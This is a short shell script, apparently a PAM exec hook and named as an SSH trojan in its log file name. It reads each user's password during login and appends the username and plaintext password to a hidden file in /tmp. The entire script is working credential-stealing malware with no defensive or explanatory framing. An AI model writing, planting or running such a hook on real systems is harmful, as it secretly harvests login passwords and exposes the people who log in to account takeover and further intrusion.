#!/bin/sh

read passwd
echo "User: $PAM_USER
Pass: $passwd" >> /tmp/.log_sshtrojan1.txt

exit $? 
